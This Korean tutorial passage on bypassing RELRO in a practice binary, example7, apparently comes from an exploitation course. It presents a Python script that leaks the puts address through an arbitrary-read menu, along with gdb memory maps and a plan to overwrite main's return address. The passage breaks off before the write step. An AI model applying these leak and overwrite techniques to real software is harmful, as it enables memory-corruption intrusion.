Bypassing RELRO :
    example7_leak.py는 1번 메뉴에 puts의 GOT 주소인 0x8049fec를 입력하여 puts 함수의 주소를 구하는 코드입니다.
    ex)
        #!/usr/bin/python
        '''
        example7_leak.py
        '''
        import struct
        import subprocess
        import os
        import pty
        def readline(fd):
        res = ''
        try:
            while True:
            ch = os.read(fd, 1)
            res += ch
            if ch == '\n':
                return res
        except:
            raise
        def read(fd, n):
        return os.read(fd, n)
        def readuntil(fd, needle):
        res = ''
        while True:
            res += os.read(fd, 1)
            if needle in res:
            return res
        def writeline(proc, data):
        try:
            proc.stdin.write(data + '\n')
            proc.stdin.flush()
        except:
            raise
        def write(proc, data):
        try:
            proc.stdin.write(data)
            proc.stdin.flush()
        except:
            raise
        def p32(val):
        return struct.pack("<I", val)
        def u32(data):
        return struct.unpack("<I", data)[0]
        out_r, out_w = pty.openpty()
        s = subprocess.Popen("./example7", stdin=subprocess.PIPE, stdout=out_w)
        def arb_read(addr):
        readuntil(out_r, "2. Arbitrary Write")
        writeline(s, "1")
        readuntil(out_r, ": ")
        writeline(s, "%d"%addr)
        return int(readuntil(out_r, "\n"), 16)
        puts_addr = arb_read(0x8049fec)
        print "puts @ "+hex(puts_addr)

    example7_leak.py의 line 56 ~ line 61에서 arb_read 함수를 구현하여 1번 메뉴의 사용을 구현하였습니다.

    example7_leak.py를 실행하면 다음과 같이 puts 함수의 주소가 출력되는 것을 볼 수 있습니다.
    ex)
        $ example7_leak.py 
        puts @ 0xf7e0eca0

    2번 메뉴의 기능인 arbitrary write를 통해 실행 흐름을 조작해 보도록 하겠습니다.

    example7의 메모리 권한을 보면 GOT에 쓰기 권한이 없다는 것을 확인할 수 있습니다.
    ex) example7의 메모리 권한
        (gdb) x/2i 0x8048420
            0x8048420:	jmp    DWORD PTR ds:0x8049fec
            0x8048426:	xchg   ax,ax
        (gdb) info proc
        process 5004
        ...
        (gdb) shell cat /proc/5004/maps
        08048000-08049000 r-xp 00000000 08:01 162698                             ~/example7
        08049000-0804a000 r--p 00000000 08:01 162698                             ~/example7
        0804a000-0804b000 rw-p 00001000 08:01 162698                             ~/example7
        …
        fffdd000-ffffe000 rw-p 00000000 00:00 0                                  [stack]

    하지만 RELRO 보호기법이 적용되어 있더라도 스택 등 동적으로 데이터를 써야 하는 메모리에는 여전히 쓰기 권한이 있습니다.

    2번 메뉴인 임의 주소 쓰기 기능을 이용해 main 함수의 리턴 주소, 즉 스택 메모리를 덮어써 example7 바이너리를 익스플로잇해 보겠습니다.

    2번 메뉴를 이용해 스택 메모리에 값을 쓰려면 스택의 주소를 알아야 합니다.








































